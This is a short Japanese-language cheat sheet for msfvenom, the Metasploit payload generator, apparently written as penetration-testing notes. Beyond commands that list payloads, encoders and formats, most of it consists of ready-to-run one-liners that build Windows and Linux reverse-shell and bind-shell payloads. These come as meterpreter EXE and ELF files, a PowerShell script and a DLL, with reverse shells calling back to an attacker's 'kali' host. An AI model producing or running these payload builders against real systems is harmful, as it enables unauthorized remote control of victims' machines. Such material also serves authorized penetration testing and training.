# msfvenom

## リスティング

``` shell
    msfvenom -l payloads #Payloads
    msfvenom -l encoders #Encoders
    msfvenom -l formats  #Format
```

* ヘルプ

```sehll
    msfvenom -h
```

* オプション

```shell
    #payload
    -p 
    #platform
    --paltform
    #format
    -f 
    #output file
    -o
```

## Windows

* ReverseShell

``` shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali IP> LPORT=<kali Port> -f exe -o reverse.exe
```

* BindShell

``` shell
   msfvenom -p windows/meterpreter/bind_tcp RHOST=<target IP> LPORT=<kali Port> -f exe -o bind.exe 
```

* powershell payload

``` shell
    msfvenom -p windows/x64/shell_bind_tcp --platform windows -f psh-net -o bind_shell.ps1 LHOST=<kali ip> LPORT=<kali port>
```

* dll

```shell
    msfvenom -p windows/x64/shell_bind_tcp --platform windows -f dll -o bind_shell.dll
```

## Linux

* ReverseShell

``` shell
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<kali IP> LPORT=<kali Port> -f elf > reverse.elf

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=<kali Port> -f elf -o shell.elf
```

* Bind Shell

``` shell
    msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<target IP> LPORT=<kali Port> -f elf -o bind.elf
```
